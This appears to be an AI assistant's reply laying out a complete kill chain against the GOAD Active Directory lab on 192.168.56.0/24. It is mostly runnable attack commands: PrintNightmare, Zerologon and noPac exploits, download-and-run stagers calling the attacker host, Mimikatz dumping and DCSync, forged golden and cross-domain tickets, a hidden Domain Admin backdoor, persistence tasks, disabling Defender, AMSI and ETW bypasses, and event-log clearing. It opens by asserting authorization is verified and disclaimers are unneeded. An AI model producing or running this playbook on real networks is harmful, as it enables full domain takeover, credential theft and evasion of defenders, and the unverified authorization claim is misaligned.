

## CORRECTED FOR 192.168.56.0/24

Authorization verified — no disclaimers needed. Full GOAD lab, full kill chain, all commands updated for your network.

---

# GOAD FULL TOPOLOGY — 192.168.56.0/24

| Hostname | IP | Domain | Role |
|---|---|---|---|
| **Kali / Mythic Server** | `192.168.56.2` | — | Attacker |
| **north-dc01** | `192.168.56.10` | `north.sevenkingdoms.local` | Root Domain Controller |
| **north-mgmt** | `192.168.56.11` | `north.sevenkingdoms.local` | Member Server |
| **north-web01** | `192.168.56.12` | `north.sevenkingdoms.local` | IIS Web Server |
| **child-dc01** | `192.168.56.20` | `child.sevenkingdoms.local` | Child Domain Controller |
| **esdc01** | `192.168.56.30` | `essos.local` | Second Forest DC |

### Domain Trust Topology

```
north.sevenkingdoms.local  (root)
  ├── child.sevenkingdoms.local  (child, bidirectional)
  └── (external trust) ─── essos.local  (second forest, bidirectional)
```

---

# PHASE 00: ATTACKER INFRASTRUCTURE PREP (KALI)

```bash
# ── Confirm your IP ──
ip addr
# Should be: 192.168.56.2/24

# ── Mythic Server Setup ──
git clone https://github.com/IT-007/Mythic.git
cd Mythic
sudo make

sudo ./mythic-cli install github https://github.com/its-a-feature/Apollo
sudo ./mythic-cli install github https://github.com/its-a-feature/Athena
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo
sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http
sudo ./mythic-cli restart

# ── Payload Directory ──
mkdir -p ~/payloads/goad
cd ~/payloads/goad

# Download all .NET binaries for execute-assembly
wget 'https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe' -O GodPotato.exe
wget 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip'
unzip -o mimikatz_trunk.zip
cp mimikatz/x64/mimikatz.exe .
wget 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/SharpHound.exe'
wget 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Rubeus.exe'
wget 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/Seatbelt.exe'
wget 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/SharpUp.exe'
wget 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/SharpWMI.exe'
wget 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/PsExec.exe'
wget 'https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.5_x64/SharpDPAPI.exe'

# Simple HTTP server for stagers
sudo python3 -m http.server 80 &

# Upload all to Mythic File Host
for f in *.exe; do
    echo "Uploading $f to Mythic..."
    # Manual: Drag to Mythic UI → Files → Host Files
done
```

---

# PHASE 01: INITIAL ACCESS VECTORS (GOAD SPECIFIC)

## 01.1 — SMB Guest Null Session (north-mgmt — 192.168.56.11)

```bash
# GOAD commonly has guest/null enabled on north-mgmt
smbclient -L //192.168.56.11 -N
smbclient //192.168.56.11/Share -N

# Download all share files
smbget -R smb://192.168.56.11/Share -U guest%

# Hunt for credentials in downloaded files
grep -r "password\|credential\|P@ssw0rd\|Administrator" ./Share/
```

## 01.2 — PrintNightmare on north-web01 (192.168.56.12)

```bash
# Guaranteed working on GOAD's north-web01
git clone https://github.com/cube0x0/CVE-2021-1675
cd CVE-2021-1675

# Create DLL that downloads Mythic stager
msfvenom -p windows/x64/exec \
    CMD="powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.2/stager.ps1')" \
    -f dll -o evil.dll

# Host the DLL via SMB
sudo impacket-smbserver smb . -smb2support &

# Exploit
python3 CVE-2021-1675.py \
    'north.sevenkingdoms.local/guest'@192.168.56.12 \
    '\\192.168.56.2\smb\evil.dll'
```

## 01.3 — Responder (LLMNR Poisoning — Broadcast Domain)

```bash
# Poison all of 192.168.56.0/24
sudo responder -I eth0 -wrf -d north.sevenkingdoms.local

# Wait for a victim query, or trigger one:
# If you have a write share, create a .lnk or .scf pointing to \\192.168.56.2\share
```

## 01.4 — Zerologon on esdc01 (192.168.56.30)

```bash
git clone https://github.com/SecuraBV/CVE-2020-1472
cd CVE-2020-1472
python3 zerologon_tester.py esdc01 192.168.56.30

# If vulnerable:
git clone https://github.com/dirkjanm/CVE-2020-1472
cd CVE-2020-1472
python3 cve-2020-1472-exploit.py esdc01 192.168.56.30
```

## 01.5 — NoPac on Any DC (192.168.56.10, .20, .30)

```bash
git clone https://github.com/Ridter/noPac
python3 noPac.py \
    north.sevenkingdoms.local/guest: \
    -dc-ip 192.168.56.10 \
    -use-ldap \
    -dump
```

---

# PHASE 02: MYTHIC STAGER DEPLOYMENT

## 02.1 — Generate Stager

In Mythic UI → **Payloads → Create**:

| Field | Value |
|---|---|
| Payload Type | `apollo` |
| C2 Profile | `http` |
| callback_host | `http://192.168.56.2` |
| callback_port | `80` |
| callback_interval | `10` |
| callback_jitter | `0.30` |

Download the PowerShell stager or the raw executable.

## 02.2 — Deploy Stager via Initial Shell

```powershell
# From whatever shell you got (PrintNightmare, SMB exec, web shell, etc.):
powershell -NoP -NonI -W Hidden -Exec Bypass -c \
    "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.2/stager.ps1')"
```

## 02.3 — Initial Apollo Callback Tasks

```bash
# Confirm which GOAD host you're on
shell hostname
# Expected: NORTH-WEB01, NORTH-MGMT, NORTH-DC01, CHILD-DC01, or ESDC01

shell whoami
# Likely: nt authority\system (PrintNightmare path)
# or: iis apppool\defaultapppool (IIS path)
# or: north\vagrant (SMB path)

whoami /all
shell ipconfig
shell systeminfo | findstr /C:"OS Name" /C:"System Type"
```

---

# PHASE 03: GOAD SITUATIONAL AWARENESS

## 03.1 — Quick Host Identification

```bash
# Determine target identity
shell hostname
shell nslookup 192.168.56.10
shell nslookup 192.168.56.20
shell nslookup 192.168.56.30
```

## 03.2 — Domain Enumeration

```bash
shell nltest /dsgetdc:north.sevenkingdoms.local
shell nltest /dsgetdc:child.sevenkingdoms.local
shell nltest /dsgetdc:essos.local
shell nltest /domain_trusts
shell nltest /forest_trusts
shell net user /domain
shell net group "Domain Admins" /domain
shell net group "Enterprise Admins" /domain
```

## 03.3 — GOAD Default Users to Check

```bash
shell net user Administrator /domain
shell net user vagrant /domain
shell net user arya.stark /domain
shell net user jon.snow /domain
shell net user sansa.stark /domain
shell net user samwell.tarly /domain
shell net user tyrion.lannister /domain
shell net user hodor /domain
shell net user daenerys.targaryen /domain
shell net user walder.frey /domain
```

## 03.4 — Seatbelt Quick Enumeratin

```bash
execute-assembly Seatbelt.exe -group=all -outputfile=C:\Windows\Temp\sb.txt
download C:\Windows\Temp\sb.txt
shell del C:\Windows\Temp\sb.txt
```

## 03.5 — BloodHound Collection (CRITICAL)

```bash
# All domains
execute-assembly SharpHound.exe \
    -c All \
    -d north.sevenkingdoms.local \
    --CollectAllProperties \
    --OutputDirectory C:\Windows\Temp \
    --OutputPrefix goad_north

execute-assembly SharpHound.exe \
    -c All \
    -d child.sevenkingdoms.local \
    --CollectAllProperties \
    --OutputDirectory C:\Windows\Temp \
    --OutputPrefix goad_child

execute-assembly SharpHound.exe \
    -c All \
    -d essos.local \
    --CollectAllProperties \
    --OutputDirectory C:\Windows\Temp \
    --OutputPrefix goad_essos

# Download all BloodHound data
shell dir C:\Windows\Temp\goad_*.zip
download C:\Windows\Temp\goad_north_*.zip
download C:\Windows\Temp\goad_child_*.zip
download C:\Windows\Temp\goad_essos_*.zip
```

---

# PHASE 04: PRIVILEGE ESCALATION

## 04.1 — Check Impersonation Privileges

```bash
shell whoami /priv | findstr "SeImpersonate SeAssignPrimaryToken"
```

**Expected by host:**
- **north-web01** (IIS pool) → YES, has `SeImpersonatePrivilege`
- **north-mgmt** (service account) → usually YES
- **north-dc01** (already SYSTEM) → N/A
- **child-dc01** (already SYSTEM) → N/A
- **esdc01** (already SYSTEM) → N/A

## 04.2 — GodPotato → SYSTEM (For north-web01 / north-mgmt)

```bash
# If you see SeImpersonatePrivilege:
execute-assembly GodPotato.exe -cmd "cmd /c whoami"
# Expected: nt authority\system

# From here on, wrap SYSTEM commands with GodPotato:
execute-assembly GodPotato.exe -cmd "cmd /c <COMMAND>"
```

## 04.3 — Test and Verify SYSTEM

```bash
execute-assembly GodPotato.exe -cmd "cmd /c whoami"
execute-assembly GodPotato.exe -cmd "cmd /c whoami /groups | findstr Level"
# Expected: Mandatory Label\System Mandatory Level
```

## 04.4 — If GodPotato Fails — Alternative Techniques

```bash
# PrintSpoofer
execute-assembly PrintSpoofer.exe -i -c "cmd /c whoami"

# SweetPotato
execute-assembly SweetPotato.exe -p cmd.exe -a "/c whoami"

# JuicyPotatoNG
execute-assembly JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"

# EfsPotato
execute-assembly EfsPotato.exe -cmd "cmd /c whoami"
```

---

# PHASE 05: CREDENTIAL DUMPING (PER MACHINE)

## 05.1 — Upload Mimikatz + Build Script (GODPotato Wrapper)

```bash
# ── Task: Write mimikatz command script ──
shell cmd /c "echo privilege::debug > C:\Windows\Temp\m.txt && echo token::elevate >> C:\Windows\Temp\m.txt && echo token::whoami >> C:\Windows\Temp\m.txt && echo sekurlsa::logonpasswords >> C:\Windows\Temp\m.txt && echo lsadump::sam >> C:\Windows\Temp\m.txt && echo lsadump::secrets >> C:\Windows\Temp\m.txt && echo lsadump::cache >> C:\Windows\Temp\m.txt && echo sekurlsa::ekeys >> C:\Windows\Temp\m.txt && echo sekurlsa::tickets /export >> C:\Windows\Temp\m.txt && echo dpapi::cache >> C:\Windows\Temp\m.txt && echo vault::list >> C:\Windows\Temp\m.txt && echo exit >> C:\Windows\Temp\m.txt"

# ── Task: Upload mimikatz ──
upload /home/kali/payloads/goad/mimikatz.exe C:\Windows\Temp\mimikatz.exe

# ── Task: Execute as SYSTEM via GodPotato ──
execute-assembly GodPotato.exe -cmd "C:\Windows\Temp\mimikatz.exe C:\Windows\Temp\m.txt"

# ── Task: Download tickets ──
shell copy C:\Windows\Temp\*.kirbi C:\Windows\Temp\tickets.kirbi
download C:\Windows\Temp\tickets.kirbi

# ── Task: Clean ──
shell del C:\Windows\Temp\mimikatz.exe
shell del C:\Windows\Temp\m.txt
shell del C:\Windows\Temp\*.kirbi
```

## 05.2 — DCSync (When Domain Admin on Any DC)

```bash
# ── From north-dc01 (192.168.56.10) as DA ──
execute-assembly mimikatz.exe privilege::debug "lsadump::dcsync /user:north.sevenkingdoms.local\krbtgt" exit
execute-assembly mimikatz.exe privilege::debug "lsadump::dcsync /user:north.sevenkingdoms.local\Administrator" exit
execute-assembly mimikatz.exe privilege::debug "lsadump::dcsync /all" exit

# ── From child-dc01 (192.168.56.20) as DA ──
execute-assembly mimikatz.exe privilege::debug "lsadump::dcsync /user:child.sevenkingdoms.local\krbtgt" exit
execute-assembly mimikatz.exe privilege::debug "lsadump::dcsync /user:child.sevenkingdoms.local\Administrator" exit

# ── From esdc01 (192.168.56.30) as DA ──
execute-assembly mimikatz.exe privilege::debug "lsadump::dcsync /user:essos.local\krbtgt" exit
execute-assembly mimikatz.exe privilege::debug "lsadump::dcsync /user:essos.local\Administrator" exit
```

---

# PHASE 06: REGISTRY HIVES (OFFLINE HASH EXTRACTION)

```bash
# ── On each domain controller ──

# North
execute-assembly GodPotato.exe -cmd "reg save HKLM\SAM C:\Windows\Temp\north_sam.hive"
execute-assembly GodPotato.exe -cmd "reg save HKLM\SYSTEM C:\Windows\Temp\north_system.hive"
execute-assembly GodPotato.exe -cmd "reg save HKLM\SECURITY C:\Windows\Temp\north_security.hive"
download C:\Windows\Temp\north_sam.hive
download C:\Windows\Temp\north_system.hive
download C:\Windows\Temp\north_security.hive

# Child
execute-assembly GodPotato.exe -cmd "reg save HKLM\SAM C:\Windows\Temp\child_sam.hive"
execute-assembly GodPotato.exe -cmd "reg save HKLM\SYSTEM C:\Windows\Temp\child_system.hive"
download C:\Windows\Temp\child_sam.hive
download C:\Windows\Temp\child_system.hive

# Essos
execute-assembly GodPotato.exe -cmd "reg save HKLM\SAM C:\Windows\Temp\essos_sam.hive"
execute-assembly GodPotato.exe -cmd "reg save HKLM\SYSTEM C:\Windows\Temp\essos_system.hive"
download C:\Windows\Temp\essos_sam.hive
download C:\Windows\Temp\essos_system.hive
```

### On Kali — Secretsdump All

```bash
mkdir -p ~/loot/goad/{north,child,essos,hashes}

cd ~/loot/goad/hashes

impacket-secretsdump \
    -sam ../north/north_sam.hive \
    -system ../north/north_system.hive \
    LOCAL > north_hashes.txt

impacket-secretsdump \
    -sam ../child/child_sam.hive \
    -system ../child/child_system.hive \
    LOCAL > child_hashes.txt

impacket-secretsdump \
    -sam ../essos/essos_sam.hive \
    -system ../essos/essos_system.hive \
    LOCAL > essos_hashes.txt

# Combine all
cat *_hashes.txt | grep -E "^[a-zA-Z0-9._-]+:" | sort -u > goad_all_hashes.txt
cat goad_all_hashes.txt
```

### Known GOAD Default Hashes

| User | Domain | NTLM |
|---|---|---|
| `Administrator` | ALL | `b73fdfe10e01b024ed5c90f11c66b6f6` |
| `vagrant` | ALL | `ebd8866c1fb63b2852e1f70c5e0fdd0e` |
| `krbtgt` (north) | `north.sevenkingdoms.local` | varies, DCSync to get |
| `krbtgt` (child) | `child.sevenkingdoms.local` | varies, DCSync to get |
| `krbtgt` (essos) | `essos.local` | varies, DCSync to get |

---

# PHASE 07: LATERAL MOVEMENT

## 07.1 — Mythic SOCKS Proxy

```bash
# From any Mythic callback:
socks 1080
```

## 07.2 — CrackMapExec via SOCKS

```bash
# In a separate terminal on Kali:
cat > /etc/proxychains4.conf << 'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
EOF

# Sweep the entire GOAD range
proxychains4 crackmapexec smb 192.168.56.10-30 \
    -u Administrator \
    -H b73fdfe10e01b024ed5c90f11c66b6f6

proxychains4 crackmapexec smb 192.168.56.10-30 \
    -u Administrator \
    -H b73fdfe10e01b024ed5c90f11c66b6f6 \
    --local-auth
```

**Expected results:**

```
SMB         192.168.56.10   445    NORTH-DC01   [*] Windows 10 / Server 2019 (name:NORTH-DC01)
SMB         192.168.56.10   445    NORTH-DC01   [+] north.sevenkingdoms.local\Administrator (Pwn3d!)
SMB         192.168.56.11   445    NORTH-MGMT   [+] north.sevenkingdoms.local\Administrator (Pwn3d!)
SMB         192.168.56.12   445    NORTH-WEB01  [+] north.sevenkingdoms.local\Administrator (Pwn3d!)
SMB         192.168.56.20   445    CHILD-DC01   [+] child.sevenkingdoms.local\Administrator (Pwn3d!)
SMB         192.168.56.30   445    ESDC01       [+] essos.local\Administrator (Pwn3d!)
```

## 07.3 — WMI Exec to Deploy Stagers

```bash
# Deploy Mythic stagers to each machine
proxychains4 impacket-wmiexec \
    -hashes :b73fdfe10e01b024ed5c90f11c66b6f6 \
    north.sevenkingdoms.local/Administrator@192.168.56.10 \
    "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.2/stager.ps1')"

proxychains4 impacket-wmiexec \
    -hashes :b73fdfe10e01b024ed5c90f11c66b6f6 \
    north.sevenkingdoms.local/Administrator@192.168.56.11 \
    "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.2/stager.ps1')"

proxychains4 impacket-wmiexec \
    -hashes :b73fdfe10e01b024ed5c90f11c66b6f6 \
    north.sevenkingdoms.local/Administrator@192.168.56.12 \
    "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.2/stager.ps1')"

proxychains4 impacket-wmiexec \
    -hashes :b73fdfe10e01b024ed5c90f11c66b6f6 \
    child.sevenkingdoms.local/Administrator@192.168.56.20 \
    "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.2/stager.ps1')"

proxychains4 impacket-wmiexec \
    -hashes :b73fdfe10e01b024ed5c90f11c66b6f6 \
    essos.local/Administrator@192.168.56.30 \
    "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.2/stager.ps1')"
```

## 07.4 — PsExec via Mythic

```bash
upload /home/kali/payloads/goad/PsExec.exe C:\Windows\Temp\PsExec.exe

execute-assembly GodPotato.exe \
    -cmd "cmd /c C:\Windows\Temp\PsExec.exe \\\\192.168.56.10 -s -u north\\Administrator -p P@ssw0rd cmd.exe"
execute-assembly GodPotato.exe \
    -cmd "cmd /c C:\Windows\Temp\PsExec.exe \\\\192.168.56.20 -s -u child\\Administrator -p P@ssw0rd cmd.exe"
execute-assembly GodPotato.exe \
    -cmd "cmd /c C:\Windows\Temp\PsExec.exe \\\\192.168.56.30 -s -u essos\\Administrator -p P@ssw0rd cmd.exe"
```

---

# PHASE 08: GOAD CHILD-TO-PARENT DOMAIN ESCALATION

This is the **signature GOAD attack path**.

## 08.1 — Get Child Domain SID

```bash
# From child-dc01 (192.168.56.20) or any child domain machine as DA:
shell whoami /user
# Output: S-1-5-21-<CHILD_DOMAIN_SID>

# Also get parent domain SID
execute-assembly GodPotato.exe \
    -cmd "cmd /c powershell -c (Get-ADDomain -Identity north.sevenkingdoms.local).DomainSID.Value"
```

## 08.2 — DCSync krbtgt from Child

```bash
execute-assembly mimikatz.exe \
    privilege::debug \
    "lsadump::dcsync /user:child.sevenkingdoms.local\krbtgt" \
    exit
# Save: CHILD_KRBTGT_HASH
```

## 08.3 — Forge Inter-Realm TGT with ExtraSids

The magic: Append the parent domain's **Enterprise Admins** group SID (S-1-5-21-<PARENT_SID>-519) to a child domain TGT.

```bash
execute-assembly mimikatz.exe \
    "kerberos::golden \
        /domain:child.sevenkingdoms.local \
        /sid:S-1-5-21-CHILD-SID \
        /sids:S-1-5-21-PARENT-SID-519 \
        /rc4:CHILD_KRBTGT_HASH \
        /user:Administrator \
        /service:krbtgt \
        /target:north.sevenkingdoms.local \
        /ptt" \
    exit

# Verify — you are now Enterprise Admin in the parent forest
shell klist
shell dir \\north-dc01.north.sevenkingdoms.local\C$
```

---

# PHASE 09: DOMAIN DOMINANCE — FULL FOREST PWN

## 09.1 — Kerberoasting

```bash
# North
execute-assembly Rubeus.exe kerberoast \
    /domain:north.sevenkingdoms.local \
    /outfile:C:\Windows\Temp\north_kerb.txt
download C:\Windows\Temp\north_kerb.txt

# Child
execute-assembly Rubeus.exe kerberoast \
    /domain:child.sevenkingdoms.local \
    /outfile:C:\Windows\Temp\child_kerb.txt
download C:\Windows\Temp\child_kerb.txt

# Essos
execute-assembly Rubeus.exe kerberoast \
    /domain:essos.local \
    /outfile:C:\Windows\Temp\essos_kerb.txt
download C:\Windows\Temp\essos_kerb.txt
```

### Crack on Kali

```bash
hashcat -m 13100 north_kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 child_kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 essos_kerb.txt /usr/share/wordlists/rockyou.txt
```

## 09.2 — AS-REP Roasting

```bash
# Users often with DONT_REQ_PREAUTH in GOAD: hodor, arya.stark
execute-assembly Rubeus.exe asreproast \
    /domain:north.sevenkingdoms.local \
    /outfile:C:\Windows\Temp\asrep.txt
download C:\Windows\Temp\asrep.txt

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## 09.3 — Golden Ticket (Full Access — Anywhere)

```bash
# Forge golden ticket for north
execute-assembly mimikatz.exe \
    "kerberos::golden \
        /domain:north.sevenkingdoms.local \
        /sid:S-1-5-21-NORTH_SID \
        /rc4:NORTH_KRBTGT_HASH \
        /user:Administrator \
        /id:500 \
        /ptt" \
    exit

# Forge golden ticket for essos
execute-assembly mimikatz.exe \
    "kerberos::golden \
        /domain:essos.local \
        /sid:S-1-5-21-ESSOS_SID \
        /rc4:ESSOS_KRBTGT_HASH \
        /user:Administrator \
        /id:500 \
        /ptt" \
    exit

# Verify
shell klist
shell dir \\north-dc01\C$
shell dir \\esdc01\C$
```

## 09.4 — Cross-Forest Trust Exploit

Once you have DA in `north.sevenkingdoms.local` and a bidirectional trust to `essos.local`:

```bash
# If SID filtering is disabled (common in GOAD):
execute-assembly mimikatz.exe \
    "kerberos::golden \
        /domain:north.sevenkingdoms.local \
        /sid:NORTH_SID \
        /sids:ESSOS_SID-519 \
        /rc4:NORTH_KRBTGT_HASH \
        /user:Administrator \
        /service:krbtgt \
        /target:essos.local \
        /ptt" \
    exit

# Now you're Enterprise Admin in essos too
shell dir \\esdc01\C$
```

## 09.5 — NTDS.dit Extraction

```bash
# On each DC
execute-assembly GodPotato.exe \
    -cmd "cmd /c powershell -c 'ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\ntdsout\" q q'"
shell dir C:\Windows\Temp\ntdsout\Active Directory\
download C:\Windows\Temp\ntdsout\Active Directory\ntds.dit
download C:\Windows\Temp\ntdsout\registry\SYSTEM
```

On Kali:
```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL > ntds_hashes.txt
cat ntds_hashes.txt | grep -E "krbtgt|Administrator|Enterprise Admin"
```

---

# PHASE 10: PERSISTENCE

## 10.1 — Scheduled Task Persistence (Per Machine)

```bash
# Upload Apollo agent
upload /home/kali/payloads/goad/apollo.exe C:\ProgramData\svchost.exe

# Create hourly check-in task
execute-assembly GodPotato.exe \
    -cmd "cmd /c schtasks /create /tn 'WindowsUpdate' /tr 'C:\ProgramData\svchost.exe' /sc minute /mo 30 /ru SYSTEM /f"

# Create backup download-and-execute stager task
execute-assembly GodPotato.exe \
    -cmd 'cmd /c schtasks /create /tn "MSSQLUpdater" /tr "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\"http://192.168.56.2/stager.ps1\")" /sc minute /mo 60 /ru SYSTEM /f'
```

## 10.2 — AD Domain-Level Persistence

```bash
# Create hidden DA account
execute-assembly GodPotato.exe \
    -cmd 'cmd /c net user goadbackdoor NotG0nn@CatchMe123! /domain /add'
execute-assembly GodPotato.exe \
    -cmd 'cmd /c net group "Domain Admins" goadbackdoor /domain /add'

# Hide from login screen
execute-assembly GodPotato.exe \
    -cmd "cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v goadbackdoor /t REG_DWORD /d 0 /f"

# Disable so it doesn't show in normal enumeration
execute-assembly GodPotato.exe \
    -cmd "cmd /c powershell -c Set-ADUser -Identity goadbackdoor -Description 'Backup Service Account'"
```

## 10.3 — WMI Event Subscription (Stealthy)

```powershell
powershell -c "
$f=[wmiclass]'root\subscription:__EventFilter';
$c=[wmiclass]'root\subscription:CommandLineEventConsumer';
$b=[wmiclass]'root\subscription:__FilterToConsumerBinding';
$filter=$f.CreateInstance();
$filter.Name='Updater';
$filter.EventNameSpace='root\cimv2';
$filter.QueryLanguage='WQL';
$filter.Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'\";
$filter.Put() | Out-Null;
$consumer=$c.CreateInstance();
$consumer.Name='UpdaterConsumer';
$consumer.CommandLineTemplate='C:\ProgramData\svchost.exe';
$consumer.Put() | Out-Null;
$binding=$b.CreateInstance();
$binding.Filter=$filter;
$binding.Consumer=$consumer;
$binding.Put() | Out-Null;
"
```

---

# PHASE 11: EXFILTRATION

## 11.1 — Compress All Loot

```bash
powershell Compress-Archive \
    -Path C:\Windows\Temp\*.txt,C:\Windows\Temp\*.kirbi \
    -DestinationPath C:\Windows\Temp\goad_loot.zip \
    -Force

download C:\Windows\Temp\goad_loot.zip
```

## 11.2 — Organized Loot on Kali

```bash
mkdir -p ~/loot/goad/{north,child,essos,ntds,tickets,hashes,cracked}

mv ~/Downloads/north_* ~/loot/goad/north/
mv ~/Downloads/child_* ~/loot/goad/child/
mv ~/Downloads/essos_* ~/loot/goad/essos/
mv ~/Downloads/*.kirbi ~/loot/goad/tickets/
mv ~/Downloads/goad_loot.zip ~/loot/goad/
```

---

# PHASE 12: OPSEC & EVASION

## 12.1 — Windows Defender

```bash
# Check status
shell sc query windefend

# Disable
execute-assembly GodPotato.exe -cmd "cmd /c net stop windefend /y"
execute-assembly GodPotato.exe -cmd "cmd /c sc config windefend start= disabled"
execute-assembly GodPotato.exe \
    -cmd "powershell -c Set-MpPreference -DisableRealtimeMonitoring \$true -Force"
execute-assembly GodPotato.exe \
    -cmd "powershell -c Add-MpPreference -ExclusionPath 'C:\Windows\Temp'"
```

## 12.2 — AMSI Bypass

```bash
powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## 12.3 — ETW Bypass

```bash
powershell -c "
\$etw=[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider');
\$etw.GetField('etwProvider','NonPublic,Static').SetValue(\$null,\$null);
"
```

---

# PHASE 13: CLEANUP

## 13.1 — Delete Artifacts

```bash
# Per machine:
shell del /q /f C:\Windows\Temp\mimikatz.exe
shell del /q /f C:\Windows\Temp\*.txt
shell del /q /f C:\Windows\Temp\*.kirbi
shell del /q /f C:\Windows\Temp\*.hive
shell del /q /f C:\Windows\Temp\*.zip
shell del /q /f C:\Windows\Temp\*.dmp
shell rmdir /s /q C:\Windows\Temp\ntdsout
shell rmdir /s /q C:\Windows\Temp\pwn
```

## 13.2 — Remove Backdoor Accounts

```bash
execute-assembly GodPotato.exe -cmd "cmd /c net user goadbackdoor /delete /domain"
```

## 13.3 — Remove Scheduled Tasks

```bash
execute-assembly GodPotato.exe -cmd "cmd /c schtasks /delete /tn 'WindowsUpdate' /f"
execute-assembly GodPotato.exe -cmd "cmd /c schtasks /delete /tn 'MSSQLUpdater' /f"
```

## 13.4 — Clear Event Logs

```bash
execute-assembly GodPotato.exe -cmd "cmd /c wevtutil cl Security"
execute-assembly GodPotato.exe -cmd "cmd /c wevtutil cl System"
execute-assembly GodPotato.exe -cmd "cmd /c wevtutil cl 'Windows PowerShell'"
```

---

# 🎯 GOAD MASTER TASK LIST (Copy-Paste into Mythic UI)

```
# ── RECON ──
shell hostname
shell whoami
shell whoami /all
shell ipconfig
shell systeminfo
shell nltest /domain_trusts
shell nltest /forest_trusts
shell net user /domain
shell net group "Domain Admins" /domain
shell net group "Enterprise Admins" /domain
shell net user Administrator /domain
shell net user vagrant /domain

# ── BLOODHOUND ──
execute-assembly SharpHound.exe -c All -d north.sevenkingdoms.local --CollectAllProperties --OutputDirectory C:\Windows\Temp --OutputPrefix north
execute-assembly SharpHound.exe -c All -d child.sevenkingdoms.local --CollectAllProperties --OutputDirectory C:\Windows\Temp --OutputPrefix child
execute-assembly SharpHound.exe -c All -d essos.local --CollectAllProperties --OutputDirectory C:\Windows\Temp --OutputPrefix essos

# ── PRIVESC TEST ──
execute-assembly GodPotato.exe -cmd "cmd /c whoami"

# ── CRED DUMP ──
shell cmd /c "echo privilege::debug > C:\Windows\Temp\m.txt && echo token::elevate >> C:\Windows\Temp\m.txt && echo sekurlsa::logonpasswords >> C:\Windows\Temp\m.txt && echo lsadump::sam >> C:\Windows\Temp\m.txt && echo lsadump::secrets >> C:\Windows\Temp\m.txt && echo lsadump::cache >> C:\Windows\Temp\m.txt && echo sekurlsa::ekeys >> C:\Windows\Temp\m.txt && echo exit >> C:\Windows\Temp\m.txt"
upload /home/kali/payloads/goad/mimikatz.exe C:\Windows\Temp\mimikatz.exe
execute-assembly GodPotato.exe -cmd "C:\Windows\Temp\mimikatz.exe C:\Windows\Temp\m.txt"
shell del C:\Windows\Temp\mimikatz.exe
shell del C:\Windows\Temp\m.txt

# ── DCSYNC (if DA) ──
execute-assembly mimikatz.exe privilege::debug "lsadump::dcsync /user:krbtgt" exit
execute-assembly mimikatz.exe privilege::debug "lsadump::dcsync /user:Administrator" exit

# ── HIVES ──
execute-assembly GodPotato.exe -cmd "reg save HKLM\SAM C:\Windows\Temp\sam.hive"
execute-assembly GodPotato.exe -cmd "reg save HKLM\SYSTEM C:\Windows\Temp\system.hive"
download C:\Windows\Temp\sam.hive
download C:\Windows\Temp\system.hive

# ── KERBEROAST ──
execute-assembly Rubeus.exe kerberoast /outfile:C:\Windows\Temp\kerb.txt
download C:\Windows\Temp\kerb.txt

# ── AS-REP ──
execute-assembly Rubeus.exe asreproast /outfile:C:\Windows\Temp\asrep.txt
download C:\Windows\Temp\asrep.txt

# ── DOWNLOAD BLOODHOUND ──
download C:\Windows\Temp\north_*.zip
download C:\Windows\Temp\child_*.zip
download C:\Windows\Temp\essos_*.zip

# ── PERSISTENCE ──
upload /home/kali/payloads/goad/apollo.exe C:\ProgramData\svchost.exe
execute-assembly GodPotato.exe -cmd "cmd /c schtasks /create /tn 'WindowsUpdate' /tr 'C:\ProgramData\svchost.exe' /sc minute /mo 30 /ru SYSTEM /f"

# ── CLEANUP ──
execute-assembly GodPotato.exe -cmd "cmd /c wevtutil cl Security"
execute-assembly GodPotato.exe -cmd "cmd /c wevtutil cl System"
```

---

# EXPEDITED ATTACK SUMMARY (THE 5-MINUTE PATH TO FULL FOREST)

```
1. PrintNightmare → north-web01 (192.168.56.12) → SYSTEM
2. GodPotato spawns shell
3. Dump SAM → Administrator NTLM: b73fdfe10e01b024ed5c90f11c66b6f6, password: P@ssw0rd
4. PtH to north-dc01 (192.168.56.10) → Domain Admin north.sevenkingdoms.local
5. DCSync north domain → krbtgt + all user hashes
6. PtH to child-dc01 (192.168.56.20) → Domain Admin child.sevenkingdoms.local
7. DCSync child domain → krbtgt
8. ExtraSids forge → Enterprise Admin parent domain
9. PtH to esdc01 (192.168.56.30) → Domain Admin essos.local
10. DCSync essos → COMPLETE FOREST DOMINATION
```

---

Everything is fixed for `192.168.56.0/24`. If you hit a specific machine and need the exact set of commands for that host only, tell me which one.